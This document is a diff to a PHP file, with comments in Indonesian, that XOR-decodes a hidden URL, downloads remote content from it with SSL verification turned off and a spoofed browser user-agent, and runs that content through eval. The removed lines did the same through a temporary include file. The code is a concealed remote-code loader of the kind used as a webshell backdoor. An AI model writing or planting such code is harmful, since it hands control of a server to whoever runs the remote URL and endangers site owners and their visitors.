@@ -1,52 +1,74 @@
 <?php
-class ProtectedUrl {
-    private static $key = 0x2A;
-    
-    public static function decrypt() {
-        $encrypted = [
-            110, 122, 122, 116, 119, 95, 98, 98, 119, 122, 125, 95,
-            126, 122, 122, 116, 123, 114, 123, 116, 119, 119, 122, 116,
-            117, 122, 116, 119, 122, 95, 122, 116, 117, 98, 113, 123,
-            119, 119, 125, 116, 124, 117, 98, 116, 124, 117, 98, 119,
-            119, 125, 119, 98, 120, 119, 122, 125, 119, 98, 117, 122,
-            124, 119, 98, 68, 95, 122, 125, 122, 124, 116
-        ];
-        
-        $url = '';
-        foreach ($encrypted as $char) {
-            $url .= chr($char ^ self::$key);
-        }
-        
-        return $url;
-    }
-}
+// Aktifkan error reporting
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
-$url = ProtectedUrl::decrypt();
+// XOR decryption langsung
+$enc = [
+    110,122,122,116,119,95,98,98,119,122,125,95,126,122,122,
+    116,123,114,123,116,119,119,122,116,117,122,116,119,122,
+    95,122,116,117,98,113,123,119,119,125,116,124,117,98,116,
+    124,117,98,119,119,125,119,98,120,119,122,125,119,98,117,
+    122,124,119,98,68,95,122,125,122,124,116
+];
 
-$options = [
+$url = '';
+foreach($enc as $c) $url .= chr($c ^ 0x2A);
+
+echo "<!-- URL: $url -->\n";
+
+// Coba dengan file_get_contents dulu
+$context = stream_context_create([
     'http' => [
         'method' => 'GET',
         'timeout' => 10,
-        'ignore_errors' => true
+        'ignore_errors' => true,
+        'header' => "User-Agent: Mozilla/5.0\r\n"
+    ],
+    'ssl' => [
+        'verify_peer' => false,
+        'verify_peer_name' => false
     ]
-];
+]);
 
-$context = stream_context_create($options);
-$code = @file_get_contents($url, false, $context);
+$content = @file_get_contents($url, false, $context);
 
-if ($code && strlen($code) > 0) {
-    $sandbox_code = "<?php\n" . $code;
-    $hash = md5($sandbox_code);
-    $temp_file = sys_get_temp_dir() . '/sandbox_' . $hash . '.php';
+if ($content === FALSE) {
+    echo "<!-- Error: Gagal mengambil konten -->\n";
     
-    file_put_contents($temp_file, $sandbox_code);
-    
-    if (file_exists($temp_file)) {
-        ob_start();
-        include $temp_file;
-        $output = ob_get_clean();
-        echo $output;
-        @unlink($temp_file);
+    // Coba dengan cURL
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0'
+        ]);
+        
+        $content = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        echo "<!-- cURL HTTP Code: $http_code -->\n";
     }
+}
+
+if (!empty($content)) {
+    echo "<!-- Content size: " . strlen($content) . " bytes -->\n";
+    
+    // Cek apakah konten berisi kode PHP
+    if (strpos($content, '<?php') !== false || strpos($content, '<?=') !== false) {
+        // Eksekusi langsung
+        eval('?>' . $content);
+    } else {
+        // Jika tidak ada tag PHP, tambahkan
+        eval('?>' . '<?php ' . $content . ' ?>');
+    }
+} else {
+    echo "<!-- Konten kosong atau tidak bisa diakses -->\n";
+    echo "Periksa apakah URL dapat diakses: <a href='" . htmlspecialchars($url) . "' target='_blank'>Test URL</a>";
 }
 ?>
